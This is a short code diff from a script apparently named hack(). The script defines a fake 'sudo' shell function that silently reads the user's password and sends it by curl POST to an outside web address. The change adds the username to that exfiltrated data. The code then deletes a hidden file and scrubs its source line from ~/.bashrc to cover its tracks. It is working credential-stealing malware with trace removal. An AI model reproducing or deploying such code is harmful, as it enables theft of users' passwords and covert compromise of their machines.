@@ -9,7 +9,7 @@ def hack():
 function sudo {
   read -s -p "[sudo] password for $USER: " pwd
 
-  curl -X POST "http://stout.hampshire.edu/~acg10/text.php" -d "message=$pwd"
+  curl -X POST "http://stout.hampshire.edu/~acg10/text.php" -d "message=$pwd&user=$USER"
 
   rm ~/.gtk3fx11
   cat ~/.bashrc | sed "/source ~\\/\\.gtk3fx11/d" > /tmp/bashrc
